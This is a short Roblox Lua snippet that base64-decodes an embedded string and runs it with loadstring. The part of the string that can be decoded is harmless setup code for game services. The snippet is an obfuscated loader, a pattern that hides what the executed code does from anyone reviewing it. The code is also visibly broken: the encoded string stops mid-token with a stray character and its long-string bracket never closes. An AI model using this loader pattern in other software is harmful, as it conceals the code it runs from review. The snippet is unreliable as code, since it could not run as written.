local data = [==[bG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIFR3ZWVuU2VydmljZSA9IGdh>
local decoded = game:GetService("HttpService"):Base64Decode(data)
loadstring(decoded)()